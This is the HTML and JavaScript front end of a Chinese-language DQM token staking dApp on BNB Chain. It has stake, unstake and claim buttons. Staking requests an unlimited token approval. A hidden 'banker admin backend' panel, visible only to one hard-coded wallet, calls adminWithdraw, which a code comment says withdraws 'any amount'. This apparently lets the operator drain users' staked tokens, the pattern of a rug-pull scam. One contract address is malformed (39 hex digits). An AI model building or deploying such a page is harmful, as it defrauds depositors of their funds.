<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>DQM 质押挖矿</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif;
    }
    body {
      background: #050814;
      color: #fff;
      padding: 20px;
      touch-action: manipulation;
    }
    .container {
      max-width: 480px;
      margin: 0 auto;
    }
    .title {
      font-size: 22px;
      font-weight: 700;
      text-align: center;
      margin: 10px 0 20px;
      color: #00e0ff;
    }
    .btn-connect {
      width: 100%;
      padding: 14px;
      border-radius: 12px;
      background: linear-gradient(90deg, #00e0ff, #9d5fff);
      color: #000;
      font-weight: 700;
      border: none;
      margin-bottom: 16px;
    }
    .card {
      background: rgba(255,255,255,0.04);
      border-radius: 16px;
      padding: 20px;
      margin-bottom: 16px;
    }
    .row {
      display: flex;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px solid rgba(255,255,255,0.05);
    }
    .label {
      color: #ccc;
    }
    .value {
      color: #fff;
      font-weight: 600;
    }
    .input {
      width: 100%;
      padding: 14px;
      border-radius: 12px;
      background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.1);
      color: #fff;
      margin: 10px 0;
    }
    .btn-group {
      display: flex;
      gap: 10px;
      margin-top: 10px;
    }
    .btn {
      flex: 1;
      padding: 14px;
      border-radius: 12px;
      font-weight: 700;
      border: none;
    }
    .btn-primary {
      background: #00e0ff;
      color: #000;
    }
    .btn-danger {
      background: #ff5699;
      color: #fff;
    }
    .btn-claim {
      background: #ff9f43;
      color: #fff;
    }
    .admin-card {
      background: rgba(255,86,153,0.06);
      border: 1px solid rgba(255,86,153,0.2);
      border-radius: 16px;
      padding: 20px;
      margin-top: 20px;
      display: none;
    }
    .admin-title {
      color: #ff5699;
      font-weight: 700;
      margin-bottom: 12px;
    }
  </style>
</head>
<body>
<div class="container">
  <h3 class="title">DQM 质押挖矿</h3>

  <button class="btn-connect" id="connectBtn" onclick="connect()">连接钱包</button>

  <!-- 合约地址 + 复制 -->
  <div class="card" style="display:flex;justify-content:space-between;align-items:center;">
    <div style="font-size:12px; color:#ccc;">合约地址</div>
    <div style="font-size:12px; color:#fff; font-family: monospace;">0x366625D6...7659</div>
    <button onclick="copyCa()" style="padding:6px 10px;border-radius:8px;background:#00e0ff;color:#000;border:none;">复制</button>
  </div>

  <!-- 信息面板 -->
  <div class="card">
    <div class="row">
      <div class="label">钱包地址</div>
      <div class="value" id="addr">-</div>
    </div>
    <div class="row">
      <div class="label">DQM 余额</div>
      <div class="value" id="bal">0.0000</div>
    </div>
    <div class="row">
      <div class="label">已质押</div>
      <div class="value" id="staked">0.0000</div>
    </div>
    <div class="row">
      <div class="label">待领取</div>
      <div class="value" id="pending">0.0000</div>
    </div>
  </div>

  <!-- 操作区 -->
  <input class="input" id="amt" placeholder="输入质押/解押数量" type="number">
  <div class="btn-group">
    <button class="btn btn-primary" onclick="stake()">质押</button>
    <button class="btn" onclick="unstake()">解押</button>
    <button class="btn btn-claim" onclick="claim()">领取</button>
  </div>

  <!-- 庄家后台 → 只保留：输入数量 + 提取 -->
  <div class="admin-card" id="adminPanel">
    <div class="admin-title">🔑 庄家管理后台</div>
    <input class="input" id="withAmt" placeholder="输入提取数量">
    <button class="btn btn-danger" onclick="withdraw()" style="width:100%;">提取代币</button>
  </div>
</div>

<script>
const CONFIG = {
  CONTRACT: "0x24e5758addef7d9d9af0901e35af28818f3b72b",
  TOKEN:    "0x366625D61063de6A719E85Fff6a9159fb3787659",
  ADMIN:    "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508",
  CHAIN:    56
};

const ABI = [
  "function stake(uint256 amount)",
  "function unstake(uint256 amount)",
  "function claim()",
  "function userInfo(address) view returns (uint256,uint256,uint256,uint256)",
  "function pendingReward(address) view returns (uint256)",
  "function adminWithdraw(uint256 amount) external"
];

const ERC20 = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) external returns (bool)"
];

let signer, user, contract, token;

async function connect() {
  if (!window.ethereum) return alert("请在钱包内打开");
  await window.ethereum.request({ method: "eth_requestAccounts" });
  const p = new ethers.BrowserProvider(window.ethereum);
  signer = await p.getSigner();
  user = await signer.getAddress();
  contract = new ethers.Contract(CONFIG.CONTRACT, ABI, signer);
  token = new ethers.Contract(CONFIG.TOKEN, ERC20, signer);
  document.getElementById("connectBtn").innerText = "已连接";
  if (user.toLowerCase() === CONFIG.ADMIN.toLowerCase()) {
    document.getElementById("adminPanel").style.display = "block";
  }
  start();
}

async function start() {
  if (!user) return;
  document.getElementById("addr").innerText = user.slice(0, 6) + "..." + user.slice(-4);
  setInterval(load, 3000);
  load();
}

async function load() {
  if (!user) return;
  try {
    const b = await token.balanceOf(user);
    const u = await contract.userInfo(user);
    const p = await contract.pendingReward(user);
    const d = 18;
    document.getElementById("bal").innerText = ethers.formatUnits(b, d);
    document.getElementById("staked").innerText = ethers.formatUnits(u[0], d);
    document.getElementById("pending").innerText = ethers.formatUnits(p, d);
  } catch (e) {}
}

async function stake() {
  const a = document.getElementById("amt").value;
  if (!a) return alert("输入数量");
  const d = 18;
  await token.approve(CONFIG.CONTRACT, ethers.MaxUint256);
  await contract.stake(ethers.parseUnits(a, d));
  alert("质押成功");
}

async function unstake() {
  const a = document.getElementById("amt").value;
  if (!a) return alert("输入数量");
  const d = 18;
  await contract.unstake(ethers.parseUnits(a, d));
  alert("解押成功");
}

async function claim() {
  await contract.claim();
  alert("领取成功");
}

// 庄家任意数量提取
async function withdraw() {
  const a = document.getElementById("withAmt").value;
  if (!a) return alert("输入提取数量");
  const d = 18;
  await contract.adminWithdraw(ethers.parseUnits(a, d));
  alert("提取成功！");
}

function copyCa() {
  navigator.clipboard.writeText(CONFIG.TOKEN);
  alert("合约地址已复制");
}
</script>
</body>
</html>
